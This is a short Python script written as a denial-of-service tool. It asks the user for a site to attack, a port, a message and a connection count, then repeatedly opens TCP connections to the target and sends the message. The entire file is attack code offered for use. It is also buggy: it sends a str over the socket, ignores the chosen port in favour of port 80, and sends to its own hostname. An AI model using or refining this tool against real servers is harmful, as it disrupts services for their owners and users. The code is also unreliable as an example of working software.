import string, sys, os, socket

def program_restart():
	python=sys.executable
	os.execl(python, python, *sys.argv)

cwd=os.getcwd()

host=input('Enter site you want to attack:')
port=int(input('Enter port you want to attack'))
msg=input('Enter message you will send:')
conn=int(input('Enter number of connections you will establish?'))

ip=socket.gethostname()

print(f'Attacking {host}')

def dos():
	ddos=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		ddos.connect((host,80))
		ddos.send(msg)
		ddos.sendto(msg, (ip,port))
		ddos.send(msg)
	except:
		print(f'Connection failed')
	ddos.close()

for i in range(1, conn):
	
	dos()
	print(f'Connection sent {socket.gethostbyname(ip)} to {host}')

choice=input('Wanna ddos more?')
if choice=='y':
	program_restart()
else:
	try:
		sys.exit()
	except:
		exit()